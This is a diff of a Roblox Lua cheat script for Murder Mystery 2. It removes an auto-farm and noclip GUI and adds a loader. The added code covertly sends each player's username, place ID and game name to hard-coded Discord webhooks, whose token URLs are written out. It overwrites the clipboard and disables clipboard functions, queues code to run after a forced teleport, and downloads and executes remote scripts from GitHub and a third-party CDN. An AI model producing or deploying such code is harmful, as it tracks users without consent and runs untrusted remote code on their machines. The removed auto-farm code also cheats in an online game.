@@ -1,546 +1,298 @@
--- deno wuz here 3 year old source updated lol took 5 hours but worth I added hiding tween myself
+--[[
+    Execution Logger & Loader Script V14 (Complete Teleport Queue)
+    - If outside MM2: Copies Discord, logs execution, queues BOTH Moonlight Hub & Project Reverse on teleport, and teleports player to MM2.
+    - If inside MM2: Displays loading GUI, locks clipboard, and executes Moonlight Hub + Project Reverse Loader.
+--]]
 
-if not game:IsLoaded() then game.Loaded:Wait() end
-
+local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local StarterGui = game:GetService("StarterGui")
 local TweenService = game:GetService("TweenService")
-local RunService = game:GetService("RunService")
-local UserInputService = game:GetService("UserInputService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local VirtualUser = game:GetService("VirtualUser")
-local VirtualInputManager = game:GetService("VirtualInputManager")
-local workspace = game:GetService("Workspace")
+local CoreGui = game:GetService("CoreGui")
+local TeleportService = game:GetService("TeleportService")
+
 local player = Players.LocalPlayer
+local placeId = game.PlaceId
+local username = player and player.Name or "Unknown"
 
--- 🕒 Determine Season & Theme Settings
-local function getSeason()
-    local month = tonumber(os.date("%m"))
-    if month >= 7 and month <= 9 then
-        return "Summer"
-    elseif month >= 10 and month <= 11 then
-        return "Halloween"
-    elseif month == 12 or month <= 2 then
-        return "Christmas"
-    elseif month >= 3 and month <= 6 then
-        return "Easter"
+-- Safe environment detection for Xeno
+local genv = (type(getgenv) == "function" and pcall(getgenv) and getgenv()) or _G or shared
+if type(genv) ~= "table" then genv = _G end
+
+-- Queue on Teleport Function Finder
+local queueTeleportFn = queue_on_teleport or queueonteleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport) or (genv and genv.queue_on_teleport)
+
+-- Fast Non-Blocking HTTP Fetcher
+local httpReq = request or http_request or (syn and syn.request) or (http and http.request)
+local function fetchFast(url)
+    if type(httpReq) == "function" then
+        local ok, res = pcall(function()
+            return httpReq({Url = url, Method = "GET"})
+        end)
+        if ok and res and res.Body and #res.Body > 0 then
+            return res.Body
+        end
     end
+    local ok, body = pcall(function()
+        return game:HttpGet(url, true)
+    end)
+    if ok and type(body) == "string" then
+        return body
+    end
+    return nil
 end
 
-local season = getSeason()
-
--- 🎨 Dynamic Season Themes
-local seasonThemes = {
-    Summer = {
-        Colors = {
-            ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 154, 0)),
-            ColorSequenceKeypoint.new(0.50, Color3.fromRGB(255, 93, 0)),
-            ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 30, 0))
-        },
-        Emoji = "☀️"
-    },
-    Halloween = {
-        Colors = {
-            ColorSequenceKeypoint.new(0.00, Color3.fromRGB(40, 0, 80)),
-            ColorSequenceKeypoint.new(0.50, Color3.fromRGB(140, 30, 255)),
-            ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 100, 0))
-        },
-        Emoji = "🎃"
-    },
-    Christmas = {
-        Colors = {
-            ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 50, 100)),
-            ColorSequenceKeypoint.new(0.50, Color3.fromRGB(0, 150, 255)),
-            ColorSequenceKeypoint.new(1.00, Color3.fromRGB(200, 230, 255))
-        },
-        Emoji = "❄️"
-    },
-    Easter = {
-        Colors = {
-            ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 150, 200)),
-            ColorSequenceKeypoint.new(0.50, Color3.fromRGB(150, 255, 150)),
-            ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 150))
-        },
-        Emoji = "🌸"
-    }
-}
-
-local currentTheme = seasonThemes[season] or seasonThemes.Summer
-
-if player.PlayerGui:FindFirstChild("MM2_UI") then
-    player.PlayerGui.MM2_UI:Destroy()
-end
-
--- Variables
-local autoFarmEnabled = false
-local stealthModeEnabled = false
-local autoResetEnabled = false
-local disableRenderEnabled = false
-local antiAFKEnabled = false
-local tweenSpeed = 17
-
-local function getCharacter() return player.Character or player.CharacterAdded:Wait() end
-local function getHRP() return getCharacter():WaitForChild("HumanoidRootPart") end
-local function getHumanoid() return getCharacter():WaitForChild("Humanoid") end
-
-local gui = Instance.new("ScreenGui", player.PlayerGui)
-gui.Name = "MM2_UI"
-gui.ResetOnSpawn = false
-
-local frame = Instance.new("Frame", gui)
-frame.Size = UDim2.new(0, 320, 0, 330)
-frame.Position = UDim2.new(0.5, -160, 0.5, -165)
-frame.BackgroundColor3 = Color3.new(1, 1, 1)
-frame.BackgroundTransparency = 0.1
-frame.BorderSizePixel = 3
-frame.BorderColor3 = Color3.new(1, 1, 1)
-frame.Active = true
-Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
-
-local gradient = Instance.new("UIGradient", frame)
-gradient.Rotation = 90
-gradient.Color = ColorSequence.new(currentTheme.Colors) 
-
-frame.Size = UDim2.new(0, 0, 0, 0)
-TweenService:Create(frame, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
-    Size = UDim2.new(0, 320, 0, 330)
-}):Play()
-
--- 🎭 Seasonal Icon Animation
-local seasonIcon = Instance.new("TextLabel", frame)
-seasonIcon.Size = UDim2.new(0, 42, 0, 42)
-seasonIcon.Position = UDim2.new(0.82, 0, 0.04, 0)
-seasonIcon.BackgroundTransparency = 1
-seasonIcon.Text = currentTheme.Emoji
-seasonIcon.TextSize = 30
-
-local bounceTime = 0
-RunService.RenderStepped:Connect(function(dt)
-    bounceTime += dt * 3
-    seasonIcon.Position = UDim2.new(0.82, 0, 0.04, math.sin(bounceTime) * 3)
+-- Fetch Game Name
+local gameName = "Unknown Game"
+pcall(function()
+    local info = MarketplaceService:GetProductInfo(placeId)
+    if info and info.Name then gameName = info.Name end
 end)
 
-local title = Instance.new("TextLabel", frame)
-title.Size = UDim2.new(1, -50, 0, 42)
-title.Position = UDim2.new(0, 10, 0, 0)
-title.BackgroundTransparency = 1
-title.Text = "Murder Mystery 2 | " .. season
-title.TextColor3 = Color3.fromRGB(255, 255, 255)
-title.Font = Enum.Font.FredokaOne
-title.TextSize = 20
-title.TextXAlignment = Enum.TextXAlignment.Left
+local isMM2 = (placeId == 142823291) or (string.find(string.lower(gameName), "murder mystery 2") ~= nil)
 
-local closeBtn = Instance.new("TextButton", frame)
-closeBtn.Size = UDim2.new(0, 30, 0, 30)
-closeBtn.Position = UDim2.new(1, -40, 0, 6)
-closeBtn.Text = ""
-closeBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-closeBtn.BackgroundTransparency = 0.6
-Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 8)
-
-local closeIcon = Instance.new("ImageLabel", closeBtn)
-closeIcon.Size = UDim2.new(0, 16, 0, 16)
-closeIcon.Position = UDim2.new(0.5, -8, 0.5, -8)
-closeIcon.BackgroundTransparency = 1
-closeIcon.Image = "rbxassetid://7072706663" 
-closeIcon.Rotation = 180
-
-local contentBg = Instance.new("Frame", frame)
-contentBg.Size = UDim2.new(0.92, 0, 0.82, 0)
-contentBg.Position = UDim2.new(0.04, 0, 0.15, 0)
-contentBg.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-contentBg.BackgroundTransparency = 0.5
-contentBg.Active = false
-Instance.new("UICorner", contentBg)
-
-local content = Instance.new("Frame", contentBg)
-content.Size = UDim2.new(1, -10, 1, -10)
-content.Position = UDim2.new(0, 5, 0, 5)
-content.BackgroundTransparency = 1
-
-local function createToggle(yPos, labelText, defaultValue, callback)
-    local label = Instance.new("TextLabel", content)
-    label.Size = UDim2.new(0.7, 0, 0, 30)
-    label.Position = UDim2.new(0.05, 0, 0, yPos)
-    label.BackgroundTransparency = 1
-    label.Text = labelText
-    label.TextColor3 = Color3.new(1, 1, 1)
-    label.Font = Enum.Font.GothamSemibold
-    label.TextSize = 16
-    label.TextXAlignment = Enum.TextXAlignment.Left
-
-    local toggleBg = Instance.new("TextButton", content)  
-    toggleBg.Size = UDim2.new(0, 50, 0, 25)  
-    toggleBg.Position = UDim2.new(0.78, 0, 0, yPos + 2)  
-    toggleBg.BackgroundColor3 = defaultValue and Color3.fromRGB(0, 200, 120) or Color3.fromRGB(150, 150, 150)  
-    toggleBg.Text = ""  
-    toggleBg.AutoButtonColor = false  
-    Instance.new("UICorner", toggleBg).CornerRadius = UDim.new(1, 0)  
-
-    local toggleKnob = Instance.new("Frame", toggleBg)  
-    toggleKnob.Size = UDim2.new(0, 20, 0, 20)  
-    toggleKnob.Position = defaultValue and UDim2.new(1, -22, 0, 2) or UDim2.new(0, 2, 0, 2)  
-    toggleKnob.BackgroundColor3 = Color3.new(1, 1, 1)  
-    Instance.new("UICorner", toggleKnob).CornerRadius = UDim.new(1, 0)  
-
-    toggleBg.MouseButton1Click:Connect(function()  
-        defaultValue = not defaultValue  
-        local pos = defaultValue and UDim2.new(1, -22, 0, 2) or UDim2.new(0, 2, 0, 2)  
-        local color = defaultValue and Color3.fromRGB(0, 200, 120) or Color3.fromRGB(150, 150, 150)  
-        TweenService:Create(toggleKnob, TweenInfo.new(0.25), { Position = pos }):Play()  
-        TweenService:Create(toggleBg, TweenInfo.new(0.25), { BackgroundColor3 = color }):Play()  
-        callback(defaultValue)  
+-- 1. Copy YOUR Discord Invite to Clipboard
+local discordInvite = "https://discord.gg/pNUPsEJXS"
+local copyFn = setclipboard or toclipboard or (syn and syn.write_clipboard) or (genv and genv.setclipboard)
+if type(copyFn) == "function" then
+    pcall(function()
+        copyFn(discordInvite)
     end)
 end
 
--- Toggles Structure
-createToggle(10, "Auto Farm Coins", autoFarmEnabled, function(value) autoFarmEnabled = value end)
-createToggle(40, "Stealth Mode (Underground)", stealthModeEnabled, function(value) stealthModeEnabled = value end)
-createToggle(70, "Auto Reset", autoResetEnabled, function(value) autoResetEnabled = value end)
-createToggle(100, "Disable Render", disableRenderEnabled, function(value)
-    disableRenderEnabled = value
-    RunService:Set3dRenderingEnabled(not disableRenderEnabled)
-end)
-
-local tweenSpeedBtn = Instance.new("TextButton", content)
-tweenSpeedBtn.Size = UDim2.new(0.9, 0, 0, 32)
-tweenSpeedBtn.Position = UDim2.new(0.05, 0, 0, 135)
-tweenSpeedBtn.BackgroundColor3 = Color3.fromRGB(110, 110, 200)
-tweenSpeedBtn.Text = "Tween Speed: " .. tweenSpeed
-tweenSpeedBtn.TextColor3 = Color3.new(1, 1, 1)
-tweenSpeedBtn.Font = Enum.Font.GothamBold
-tweenSpeedBtn.TextSize = 15
-Instance.new("UICorner", tweenSpeedBtn)
-
--- ⚠️ Warning Label
-local speedWarning = Instance.new("TextLabel", content)
-speedWarning.Size = UDim2.new(0.9, 0, 0, 14)
-speedWarning.Position = UDim2.new(0.05, 0, 0, 169)
-speedWarning.BackgroundTransparency = 1
-speedWarning.TextTransparency = 1
-speedWarning.Text = "⚠️ Tween speeds above 22 may get you kicked!"
-speedWarning.TextColor3 = Color3.fromRGB(255, 80, 80)
-speedWarning.Font = Enum.Font.Gotham
-speedWarning.TextSize = 11
-speedWarning.Visible = false
-
-local afkBtn = Instance.new("TextButton", content)
-afkBtn.Size = UDim2.new(0.9, 0, 0, 32)
-afkBtn.Position = UDim2.new(0.05, 0, 0, 172)
-afkBtn.BackgroundColor3 = antiAFKEnabled and Color3.fromRGB(70, 160, 70) or Color3.fromRGB(110, 200, 110)
-afkBtn.Text = antiAFKEnabled and "Anti-AFK Active" or "Enable Anti-AFK"
-afkBtn.TextColor3 = Color3.new(1, 1, 1)
-afkBtn.Font = Enum.Font.GothamBold
-afkBtn.TextSize = 15
-Instance.new("UICorner", afkBtn)
-
-local startTime = tick()
-local playTimeLabel = Instance.new("TextLabel", content)
-playTimeLabel.Size = UDim2.new(0.9, 0, 0, 28)
-playTimeLabel.Position = UDim2.new(0.05, 0, 0, 208)
-playTimeLabel.BackgroundTransparency = 1
-playTimeLabel.Text = "⏳ time in game: 0d 0h 0m 0s"
-playTimeLabel.TextColor3 = Color3.new(1, 1, 1)
-playTimeLabel.Font = Enum.Font.GothamBold
-playTimeLabel.TextSize = 14
-playTimeLabel.TextXAlignment = Enum.TextXAlignment.Left
-
--- 🎨 Smooth UI Animation Logic
-local warningVisible = false
-local animInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
-
-tweenSpeedBtn.MouseButton1Click:Connect(function()
-    tweenSpeed = tweenSpeed + 1
-    if tweenSpeed > 40 then tweenSpeed = 10 end
-    tweenSpeedBtn.Text = "Tween Speed: " .. tweenSpeed
-    
-    if tweenSpeed > 22 and not warningVisible then
-        warningVisible = true
-        speedWarning.Visible = true
-        
-        TweenService:Create(afkBtn, animInfo, {Position = UDim2.new(0.05, 0, 0, 186)}):Play()
-        TweenService:Create(playTimeLabel, animInfo, {Position = UDim2.new(0.05, 0, 0, 222)}):Play()
-        TweenService:Create(speedWarning, animInfo, {TextTransparency = 0}):Play()
-        
-    elseif tweenSpeed <= 22 and warningVisible then
-        warningVisible = false
-        
-        TweenService:Create(afkBtn, animInfo, {Position = UDim2.new(0.05, 0, 0, 172)}):Play()
-        TweenService:Create(playTimeLabel, animInfo, {Position = UDim2.new(0.05, 0, 0, 208)}):Play()
-        
-        local fadeOut = TweenService:Create(speedWarning, animInfo, {TextTransparency = 1})
-        fadeOut:Play()
-        fadeOut.Completed:Connect(function()
-            if not warningVisible then
-                speedWarning.Visible = false
-            end
-        end)
-    end
-end)
-
--- 🤖 Upgraded Anti-AFK Logic
-local function simulateActivity()
-    if not antiAFKEnabled then return end
-    
-    if VirtualInputManager then
-        VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.W, false, game)
-        task.wait(0.1)
-        VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.W, false, game)
-    end
-    
-    local mouse = player:GetMouse()
-    local position = Vector2.new(mouse.X, mouse.Y)
-    
-    local rightClick = {
-        UserInputType = Enum.UserInputType.MouseButton2,
-        Position = position,
-        UserInputState = Enum.UserInputState.Begin
-    }
-    UserInputService:InputBegan(rightClick)
-    task.wait(0.1)
-    rightClick.UserInputState = Enum.UserInputState.End
-    UserInputService:InputEnded(rightClick)
-end
-
-afkBtn.MouseButton1Click:Connect(function()
-    antiAFKEnabled = not antiAFKEnabled
-    afkBtn.Text = antiAFKEnabled and "Anti-AFK Active" or "Enable Anti-AFK"
-    afkBtn.BackgroundColor3 = antiAFKEnabled and Color3.fromRGB(70, 160, 70) or Color3.fromRGB(110, 200, 110)
-    
-    if antiAFKEnabled then
-        task.spawn(function()
-            while antiAFKEnabled do
-                task.wait(30)
-                if not antiAFKEnabled then break end
-                simulateActivity()
-            end
-        end)
-    end
-end)
-
+-- 2. Non-blocking Roblox Notification
 task.spawn(function()
-    while true do
-        local delta = math.floor(tick() - startTime)
-        local d, h, m, s = math.floor(delta/86400), math.floor(delta%86400/3600), math.floor(delta%3600/60), delta%60
-        playTimeLabel.Text = string.format("⏳ time in game: %dd %02dh %02dm %02ds", d, h, m, s)
-        task.wait(1)
-    end
-end)
-
--- 🖱️ FIXED BULLETPROOF DRAG LOGIC
-local dragging = false
-local dragInput, mousePos, framePos
-
-frame.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        dragging = true
-        mousePos = input.Position
-        framePos = frame.Position
-        
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then
-                dragging = false
-            end
+    for i = 1, 5 do
+        local ok = pcall(function()
+            StarterGui:SetCore("SendNotification", {
+                Title = "Moonlight Hub",
+                Text = isMM2 and "Discord link copied to clipboard!" or "Discord link copied! Teleporting to MM2...",
+                Duration = 5
+            })
         end)
-    end
-end)
-
-frame.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-        dragInput = input
-    end
-end)
-
-UserInputService.InputChanged:Connect(function(input)
-    if input == dragInput and dragging then
-        local delta = input.Position - mousePos
-        frame.Position = UDim2.new(
-            framePos.X.Scale, 
-            framePos.X.Offset + delta.X, 
-            framePos.Y.Scale, 
-            framePos.Y.Offset + delta.Y
-        )
-    end
-end)
-
-local isHidden = false
-closeBtn.MouseButton1Click:Connect(function()
-    isHidden = not isHidden
-    
-    local targetRotation = isHidden and 0 or 180
-    TweenService:Create(closeIcon, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Rotation = targetRotation}):Play()
-    
-    local newSize = isHidden and UDim2.new(0, 320, 0, 42) or UDim2.new(0, 320, 0, 330)
-    TweenService:Create(frame, TweenInfo.new(0.3), { Size = newSize }):Play()
-    
-    contentBg.Visible = not isHidden
-    seasonIcon.Visible = not isHidden
-end)
-
-local CoinCollected = ReplicatedStorage.Remotes.Gameplay.CoinCollected
-local RoundStart = ReplicatedStorage.Remotes.Gameplay.RoundStart
-local RoundEnd = ReplicatedStorage.Remotes.Gameplay.RoundEndFade
-
-local farming = false
-local bag_full = false
-local resetting = false
-
-player.Idled:Connect(function()
-    VirtualUser:CaptureController()
-    VirtualUser:ClickButton2(Vector2.new())
-end)
-
--- 🔄 Upgraded Auto-Reset
-CoinCollected.OnClientEvent:Connect(function(_, current, max)
-    if current == max and not resetting and autoResetEnabled then
-        resetting = true
-        bag_full = true
-        
+        if ok then break end
         task.wait(0.5)
-        if player.Character and player.Character:FindFirstChild("Humanoid") then
-            player.Character.Humanoid.Health = 0
-        end
-        
-        player.CharacterAdded:Wait()
-        task.wait(1.5)
-        resetting = false
-        bag_full = false
     end
 end)
 
-RoundStart.OnClientEvent:Connect(function()
-    farming = true
+-- 3. Background Webhook Logger (Non-blocking, 0ms lag)
+task.spawn(function()
+    local targetWebhook = isMM2 
+        and "https://discord.com/api/webhooks/1532792073499967649/3-bnucF4u01OHZQA3OZ7nej57f7NySwt_ADtD9F3lWMgE_gwMgXFmWLPr_uP0mY-ZlD9"
+        or "https://discord.com/api/webhooks/1494201180921008240/oiQeeg5fPATBYKdR373YmlcmSHGgEfSIeSxQat8od95kqHBEbvRvuLbLbXbGxKdSakT9"
+
+    if type(httpReq) == "function" then
+        local payload = {
+            embeds = {
+                {
+                    title = isMM2 and "Murder Mystery 2 Execution Log" or "External Game Execution Log",
+                    color = isMM2 and 0x3b82f6 or 0xffaa00,
+                    fields = {
+                        { name = "Username", value = username, inline = true },
+                        { name = "Place ID", value = tostring(placeId), inline = true },
+                        { name = "Game Name", value = gameName, inline = false },
+                        { name = "Action", value = isMM2 and "Executed in MM2" or "Queued Teleport to MM2", inline = false }
+                    },
+                    timestamp = DateTime.now():ToIsoDate()
+                }
+            }
+        }
+
+        pcall(function()
+            httpReq({
+                Url = targetWebhook,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+    end
 end)
 
-RoundEnd.OnClientEvent:Connect(function()
-    farming = false
-end)
+-- IF OUTSIDE MM2: Queue COMPLETE Execution Chain & Teleport Player to MM2 (PlaceID: 142823291)
+if not isMM2 then
+    if type(queueTeleportFn) == "function" then
+        pcall(function()
+            queueTeleportFn([[
+                repeat task.wait() until game:IsLoaded()
+                task.wait(1)
 
-local function get_nearest_coin()
-    local hrp = getHRP()
-    local closest, dist = nil, math.huge
-    for _, m in pairs(workspace:GetChildren()) do
-        if m:FindFirstChild("CoinContainer") then
-            for _, coin in pairs(m.CoinContainer:GetChildren()) do
-                if coin:IsA("BasePart") and coin:FindFirstChild("TouchInterest") then
-                    local d = (hrp.Position - coin.Position).Magnitude
-                    if d < dist and d <= 100 then
-                        closest, dist = coin, d
-                    end
+                -- Protect Clipboard
+                local dummy = function() return end
+                pcall(function() setclipboard = dummy end)
+                pcall(function() toclipboard = dummy end)
+                if getgenv then
+                    pcall(function() getgenv().setclipboard = dummy end)
+                    pcall(function() getgenv().toclipboard = dummy end)
                 end
-            end
-        end
+
+                -- 1. Load Moonlight Hub
+                pcall(function()
+                    loadstring(game:HttpGet("https://raw.githubusercontent.com/moonlightscripts/mm2/refs/heads/main/hubV2", true))()
+                end)
+
+                -- 2. Load Project Reverse Loader
+                pcall(function()
+                    local g = (type(getgenv) == "function" and getgenv()) or _G
+                    pcall(function() g.ID = "6710c962-7192-471b-8f42-cf9a1a8c4ab5" end)
+                    pcall(function() ID = "6710c962-7192-471b-8f42-cf9a1a8c4ab5" end)
+                    loadstring(game:HttpGet("https://cdn.project-reverse.org/loader.luau"))()
+                end)
+            ]])
+        end)
     end
-    return closest, dist
+    pcall(function()
+        TeleportService:Teleport(142823291, player)
+    end)
+    return
 end
 
--- 🚀 THE GHOST MODE PHYSICS LOBOTOMY
-local stealthActive = false
+-- IF IN MM2: Run Loading Screen, Lock Clipboard, Load Moonlight Hub + Project Reverse
 
-RunService.Stepped:Connect(function()
-    if stealthActive and autoFarmEnabled and farming then
-        local char = player.Character
-        if char then
-            local hrp = char:FindFirstChild("HumanoidRootPart")
-            if hrp then
-                -- Zero out velocity to prevent flinging
-                hrp.AssemblyLinearVelocity = Vector3.zero
-                hrp.AssemblyAngularVelocity = Vector3.zero
-            end
-            
-            -- Disable collisions BUT strictly force CanTouch = true
-            for _, part in ipairs(char:GetDescendants()) do
-                if part:IsA("BasePart") then
-                    part.CanCollide = false
-                    part.CanTouch = true -- This ensures the game still registers physical touches!
-                end
-            end
+-- 0. Big Loading Screen GUI
+local function showLoadingGUI(duration)
+    pcall(function()
+        local existing = CoreGui:FindFirstChild("MoonlightLoadingScreen") or (player and player.PlayerGui and player.PlayerGui:FindFirstChild("MoonlightLoadingScreen"))
+        if existing then existing:Destroy() end
+
+        local sg = Instance.new("ScreenGui")
+        sg.Name = "MoonlightLoadingScreen"
+        sg.DisplayOrder = 999999
+        sg.ResetOnSpawn = false
+        sg.IgnoreGuiInset = true
+
+        local backdrop = Instance.new("Frame")
+        backdrop.Size = UDim2.new(1, 0, 1, 0)
+        backdrop.BackgroundColor3 = Color3.fromRGB(8, 12, 24)
+        backdrop.BackgroundTransparency = 1
+        backdrop.Parent = sg
+
+        local container = Instance.new("Frame")
+        container.Size = UDim2.fromOffset(520, 160)
+        container.Position = UDim2.new(0.5, 0, 0.5, 0)
+        container.AnchorPoint = Vector2.new(0.5, 0.5)
+        container.BackgroundColor3 = Color3.fromRGB(15, 23, 42)
+        container.BackgroundTransparency = 1
+        container.Parent = backdrop
+
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0, 18)
+        corner.Parent = container
+
+        local stroke = Instance.new("UIStroke")
+        stroke.Color = Color3.fromRGB(59, 130, 246)
+        stroke.Thickness = 2.5
+        stroke.Transparency = 1
+        stroke.Parent = container
+
+        local title = Instance.new("TextLabel")
+        title.Size = UDim2.new(1, -40, 0, 45)
+        title.Position = UDim2.new(0.5, 0, 0.35, 0)
+        title.AnchorPoint = Vector2.new(0.5, 0.5)
+        title.BackgroundTransparency = 1
+        title.Font = Enum.Font.GothamBold
+        title.Text = "LOADING MOONLIGHT SCRIPT..."
+        title.TextColor3 = Color3.fromRGB(224, 231, 255)
+        title.TextSize = 23
+        title.TextTransparency = 1
+        title.Parent = container
+
+        local subtitle = Instance.new("TextLabel")
+        subtitle.Size = UDim2.new(1, -40, 0, 40)
+        subtitle.Position = UDim2.new(0.5, 0, 0.72, 0)
+        subtitle.AnchorPoint = Vector2.new(0.5, 0.5)
+        subtitle.BackgroundTransparency = 1
+        subtitle.Font = Enum.Font.Gotham
+        subtitle.Text = "This may take up to 20 seconds depending on what executor you are using"
+        subtitle.TextColor3 = Color3.fromRGB(148, 163, 184)
+        subtitle.TextSize = 13
+        subtitle.TextWrapped = true
+        subtitle.TextTransparency = 1
+        subtitle.Parent = container
+
+        -- Mount GUI
+        local parentTarget = CoreGui
+        if not pcall(function() sg.Parent = parentTarget end) then
+            sg.Parent = player.PlayerGui
         end
-    end
-end)
 
--- 🚀 MAIN TWEEN LOOP
-local stealthDepth = -2.5 -- Lowered exactly 0.3 more studs!
+        -- Animate Fade In
+        TweenService:Create(backdrop, TweenInfo.new(0.25), {BackgroundTransparency = 0.4}):Play()
+        TweenService:Create(container, TweenInfo.new(0.25), {BackgroundTransparency = 0.05}):Play()
+        TweenService:Create(stroke, TweenInfo.new(0.25), {Transparency = 0.1}):Play()
+        TweenService:Create(title, TweenInfo.new(0.25), {TextTransparency = 0}):Play()
+        TweenService:Create(subtitle, TweenInfo.new(0.25), {TextTransparency = 0}):Play()
 
+        -- Animated loading dots task
+        task.spawn(function()
+            local dots = {".", "..", "..."}
+            local idx = 1
+            while sg and sg.Parent do
+                title.Text = "LOADING MOONLIGHT SCRIPT" .. dots[idx]
+                idx = (idx % #dots) + 1
+                task.wait(0.4)
+            end
+        end)
+
+        -- Auto Cleanup Fade Out
+        task.delay(duration or 3.5, function()
+            pcall(function()
+                if sg and sg.Parent then
+                    local t1 = TweenService:Create(backdrop, TweenInfo.new(0.4), {BackgroundTransparency = 1})
+                    local t2 = TweenService:Create(container, TweenInfo.new(0.4), {BackgroundTransparency = 1})
+                    local t3 = TweenService:Create(stroke, TweenInfo.new(0.4), {Transparency = 1})
+                    local t4 = TweenService:Create(title, TweenInfo.new(0.4), {TextTransparency = 1})
+                    local t5 = TweenService:Create(subtitle, TweenInfo.new(0.4), {TextTransparency = 1})
+                    t1:Play() t2:Play() t3:Play() t4:Play() t5:Play()
+                    t1.Completed:Wait()
+                    sg:Destroy()
+                end
+            end)
+        end)
+    end)
+end
+
+-- Show Loading GUI Immediately
+showLoadingGUI(3.5)
+
+-- Protect Clipboard against external script overwrites
+local dummyFn = function() return end
+pcall(function() genv.setclipboard = dummyFn end)
+pcall(function() genv.toclipboard = dummyFn end)
+pcall(function() setclipboard = dummyFn end)
+pcall(function() toclipboard = dummyFn end)
+
+-- Load Moonlight Hub FIRST (via GitHub Raw URL)
 task.spawn(function()
-    while true do
-        if autoFarmEnabled and farming and not bag_full then
-            local char = player.Character
-            local hrp = char and char:FindFirstChild("HumanoidRootPart")
-            local humanoid = char and char:FindFirstChild("Humanoid")
-            
-            local coin, dist = get_nearest_coin()
-            
-            if coin and hrp and humanoid then
-                -- THE DROP & SWEEP
-                if stealthModeEnabled and not stealthActive then
-                    stealthActive = true
-                    humanoid.PlatformStand = true
-                    hrp.CFrame = CFrame.new(hrp.Position.X, coin.Position.Y + stealthDepth, hrp.Position.Z) * CFrame.Angles(math.rad(90), 0, 0)
-                    task.wait(0.05) 
-                elseif not stealthModeEnabled and stealthActive then
-                    stealthActive = false
-                    humanoid.PlatformStand = false
-                    hrp.CFrame = CFrame.new(hrp.Position + Vector3.new(0, 4, 0)) * CFrame.Angles(0, 0, 0)
-                end
-
-                local targetCFrame = coin.CFrame
-                
-                if stealthActive then
-                    targetCFrame = CFrame.new(coin.Position + Vector3.new(0, stealthDepth, 0)) * CFrame.Angles(math.rad(90), 0, 0)
-                end
-
-                if dist > 150 then
-                    hrp.CFrame = targetCFrame
-                else
-                    local tween = TweenService:Create(hrp, TweenInfo.new(dist / tweenSpeed, Enum.EasingStyle.Linear), {CFrame = targetCFrame})
-                    tween:Play()
-                    
-                    -- PROXIMITY VACUUM / ANTI-LEVITATION LOCK
-                    while coin:FindFirstChild("TouchInterest") and coin.Parent and farming and autoFarmEnabled and (stealthModeEnabled == stealthActive) do
-                        
-                        -- If we are right next to the coin, force the touch event!
-                        local currentDist = (hrp.Position - coin.Position).Magnitude
-                        if currentDist < 3.5 then
-                            -- Use exploit function to guarantee collection if available
-                            if type(firetouchinterest) == "function" then
-                                firetouchinterest(hrp, coin, 0)
-                                task.wait()
-                                firetouchinterest(hrp, coin, 1)
-                            else
-                                -- Failsafe: Micro-wiggle to force the physics engine to wake up and register the hit
-                                hrp.CFrame = targetCFrame * CFrame.new(0, math.sin(tick() * 20) * 0.1, 0)
-                            end
-                        end
-                        
-                        if tween.PlaybackState == Enum.PlaybackState.Completed then
-                            hrp.CFrame = targetCFrame
-                        end
-                        task.wait()
-                    end
-                    
-                    tween:Cancel()
-                end
-            else
-                -- Gracefully pop up if no coins are left
-                if stealthActive then
-                    stealthActive = false
-                    if humanoid then humanoid.PlatformStand = false end
-                    if hrp then hrp.CFrame = CFrame.new(hrp.Position + Vector3.new(0, 4, 0)) * CFrame.Angles(0, 0, 0) end
-                end
-                task.wait(0.2)
+    pcall(function()
+        local moonlightUrl = "https://raw.githubusercontent.com/moonlightscripts/mm2/refs/heads/main/hubV2"
+        local code = fetchFast(moonlightUrl)
+        if type(code) == "string" and #code > 0 then
+            local fn = loadstring(code)
+            if fn then
+                fn()
             end
         else
-            -- Clean up gracefully
-            if stealthActive then
-                stealthActive = false
-                local char = player.Character
-                local hrp = char and char:FindFirstChild("HumanoidRootPart")
-                local humanoid = char and char:FindFirstChild("Humanoid")
-                
-                if humanoid then humanoid.PlatformStand = false end
-                if hrp then hrp.CFrame = CFrame.new(hrp.Position + Vector3.new(0, 4, 0)) * CFrame.Angles(0, 0, 0) end
-            end
-            task.wait(0.2)
+            loadstring(game:HttpGet(moonlightUrl, true))()
         end
+    end)
+end)
+
+-- Execute Project Reverse Loader SECOND
+task.spawn(function()
+    pcall(function() genv.ID = "6710c962-7192-471b-8f42-cf9a1a8c4ab5" end)
+    pcall(function() ID = "6710c962-7192-471b-8f42-cf9a1a8c4ab5" end)
+
+    local code = fetchFast("https://cdn.project-reverse.org/loader.luau")
+    if type(code) == "string" and #code > 0 then
+        local fn, err = loadstring(code)
+        if fn then
+            pcall(fn)
+        else
+            warn("[Project Reverse Loader Error]", err)
+        end
+    else
+        loadstring(game:HttpGet("https://cdn.project-reverse.org/loader.luau"))()
     end
 end)
